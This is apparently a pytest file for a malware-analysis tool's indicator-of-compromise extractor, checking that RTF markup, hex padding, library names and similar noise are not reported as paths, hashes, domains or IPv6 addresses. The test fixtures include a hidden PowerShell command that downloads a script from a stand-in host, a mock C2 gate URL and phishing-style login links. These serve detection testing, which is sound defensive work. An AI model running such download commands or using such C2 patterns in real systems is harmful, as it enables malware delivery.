"""IOC noise seen on real cases: RTF markup and hex padding from emldump,
shared libraries as domains, capa names as commands, '::' as IPv6."""

from __future__ import annotations

from docutracex import ioc


def _vals(sources):
    return {(i["type"], i["value"]) for i in ioc.extract(sources)["iocs"]}


def _text(t: str):
    return _vals([{"module": "t", "location": "x", "text": t}])


def test_rtf_markup_is_not_a_path_but_guid_folders_and_unc_are() -> None:
    got = _text(r"{\rtf1 \\d}}{\fldrslt HYPERLINK}} {\*\datastore 0105}  "
                r"C:\ProgramData\{3F2504E0-4F89-11D3-9A0C-0305E82C3301}\upd.exe  \\fileserver\share\x.doc "
                r"\\host@SSL@443\DavWWWRoot\a.dll")
    paths = {v for t, v in got if t == "filepath"}
    assert paths == {r"C:\ProgramData\{3F2504E0-4F89-11D3-9A0C-0305E82C3301}\upd.exe",
                     r"\\fileserver\share\x.doc", r"\\host@SSL@443\DavWWWRoot\a.dll"}


def test_hex_padding_is_not_a_hash() -> None:
    pad = "0" * 80 + "f" * 24 + "0" * 24
    got = _text(f"{pad} 0000000000000000000000000a000201ffffffff02000000ffffffff000000000000 "
                "d41d8cd98f00b204e9800998ecf8427e "
                "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
    assert {v for t, v in got if t == "hash_like"} == {
        "d41d8cd98f00b204e9800998ecf8427e",
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}


def test_shared_libraries_are_not_domains() -> None:
    got = _text("needs libandroid.so liblog.so libc.so libm.so libdl.so libapp.so libssl.so.3 "
                "libc++_shared.so; workspace at notion.so and c2 at update.facturas.so")
    assert {v for t, v in got if t == "domain"} == {"notion.so", "update.facturas.so"}


def test_ipv6_fragments() -> None:
    got = _text(":: ::1 1:: a:b:: std::map 2001:db8::5 2001:db8:85a3::8a2e:370:7334")
    assert {v for t, v in got if t == "ipv6"} == {"2001:db8::5", "2001:db8:85a3::8a2e:370:7334"}


def test_binary_metadata_and_capa_are_not_mined_but_strings_are() -> None:
    mods = {"msi": {"items": [{
        "file": "libapp.so", "imports_dll": ["KERNEL32.dll", "evil.example"],
        "lief": {"libraries": ["liblog.so", "libc.so"], "export_name": "libapp.so",
                 "pdb": r"C:\Users\jmartin\source\repos\InvoiceSync\Release\helper.pdb"},
        "capa": {"capabilities": [{"name": "query or enumerate registry key",
                                   "attack": [{"technique": "Query Registry", "id": "T1012"}],
                                   "namespace": "host-interaction/registry"}]},
        "floss_strings": ["::", "http://c2.facturas.example/gate.php", "reg query HKCU\\Software\\Inv /v x"]}]}}
    got = _vals(ioc.sources_from_modules(mods))
    assert ("filepath", r"C:\Users\jmartin\source\repos\InvoiceSync\Release\helper.pdb") in got
    assert ("url", "http://c2.facturas.example/gate.php") in got
    assert ("registry_key", "HKCU\\Software\\Inv") in got
    assert not [v for t, v in got if t == "domain" and v.endswith(".so")]
    assert not [v for t, v in got if "registry key" in v.lower() or v == "Query Registry"]
    assert not [v for t, v in got if t == "ipv6"]


def test_emldump_of_non_text_parts_is_not_mined() -> None:
    mods = {"mailrules": {"tools": {
        "emldump part 7 (application/msword)": {"output": r"{\rtf1 \\d}}{\fldrslt http://in-rtf.example/x}"},
        "emldump part 2 (text/plain)": {"output": "Acceda en http://portal.facturas.example/login"}}}}
    got = _vals(ioc.sources_from_modules(mods))
    assert ("url", "http://portal.facturas.example/login") in got
    assert not [v for t, v in got if "in-rtf" in v or "fldrslt" in v]


def test_native_libs_apk_end_to_end(tmp_path, monkeypatch) -> None:
    import json
    import sys
    from pathlib import Path

    sys.path.insert(0, str(Path(__file__).parent))
    from test_js_techniques import _analyze, _ms
    from fastapi.testclient import TestClient

    from docutracex.app import create_app
    from docutracex.config import settings

    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    (tmp_path / "cases").mkdir()
    client = TestClient(create_app())
    _, res = _analyze(client, "sample_native_libs.apk", _ms().native_libs_apk())
    tree = json.loads((res / "nested.json").read_text())["tree"]
    libs = [(n["format"], n["member"]) for n in tree if n["filename"] == "libapp.so"]
    assert sorted(libs) == [("ELF", "lib/arm64-v8a/libapp.so"), ("ELF", "lib/x86_64/libapp.so")]
    iocs = json.loads((res / "iocs.json").read_text())["iocs"]
    assert not [i for i in iocs if i["type"] == "domain" and i["value"].endswith(".so")]
    assert not [i for i in iocs if i["type"] == "ipv6"]


# --- more noise seen on sample.eml -------------------------------------------------

def test_olevba_descriptions_are_not_commands_but_real_commands_are() -> None:
    got = _text("|Suspicious|powershell |May run PowerShell commands | and uses cmd prompts\n"
                "Shell \"powershell -nop -w hidden -c iwr http://x.facturas.example/a.ps1\"\n"
                "cmd.exe calc\n& powershell bypass")
    cmds = {v for t, v in got if t == "command"}
    assert not [c for c in cmds if c in ("PowerShell commands", "cmd prompts")]
    assert any(c.startswith("powershell -nop -w hidden") for c in cmds)
    assert "cmd.exe calc" in cmds and "powershell bypass" in cmds
    mods = {"oletools": {"tools": {"olevba": {"analysis": [
        {"type": "Suspicious", "keyword": "powershell", "description": "May run PowerShell commands"}]}}}}
    assert not [v for t, v in _vals(ioc.sources_from_modules(mods)) if t == "command"]


def test_code_member_assignments_are_not_domains() -> None:
    got = _text("var a = document.createElement('a'); a.href = URL.createObjectURL(f); a.download = 'F.zip'; "
                "b.download('x'); if (r.status == 200) {} ; visit cdn.facturas.download or evil.download")
    assert {v for t, v in got if t == "domain"} == {"cdn.facturas.download", "evil.download"}


def test_digests_printed_by_a_tool_are_not_hashes_but_sample_hashes_are() -> None:
    out = ("|          |MD5 = '70a4ea45faf7eb21940332aafc34e25b'   |          |CLSID: 00000300-0000-0000\n"
           "|  sha256: 2f1c4a9e8b7d6c5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e")
    tool = _vals([{"module": "rtf", "location": "pedido.doc › tools/rtfobj/output", "text": out}])
    assert not [v for t, v in tool if t == "hash_like"]
    # the same text as sample content (a ransom note, a report) is still mined
    note = _vals([{"module": "email", "location": "body", "text": out}])
    assert ("hash_like", "70a4ea45faf7eb21940332aafc34e25b") in note
